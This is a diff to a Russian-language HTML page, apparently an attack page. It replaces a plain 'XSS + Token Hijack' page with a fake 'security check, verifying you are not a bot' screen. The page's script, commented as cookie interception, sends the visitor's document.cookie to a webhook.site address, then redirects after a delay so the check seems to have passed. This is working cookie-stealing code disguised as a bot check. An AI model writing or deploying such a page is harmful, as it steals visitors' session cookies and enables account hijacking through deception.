@@ -2,16 +2,58 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>XSS + Token Hijack</title>
-  <script>
-    fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
-      .then(() => {
-        window.location.href = "https://kazcyber.github.io/";
-      });
-  </script>
+  <title>Проверка безопасности</title>
+  <style>
+    body {
+      background: #f4f4f4;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .loader {
+      margin: 20px auto;
+      border: 4px solid #ccc;
+      border-top: 4px solid #333;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <h1>Загрузка...</h1>
+  <div class="box">
+    <h2>Проверка безопасности</h2>
+    <p>Подождите, мы проверяем, что вы не бот...</p>
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    // Перехват cookie
+    fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
+      .then(() => {
+        // Задержка перед редиректом — как будто "прошёл проверку"
+        setTimeout(() => {
+          window.location.href = "https://kazcyber.github.io/";
+        }, 3000);
+      });
+  </script>
 </body>
 </html>
+
 
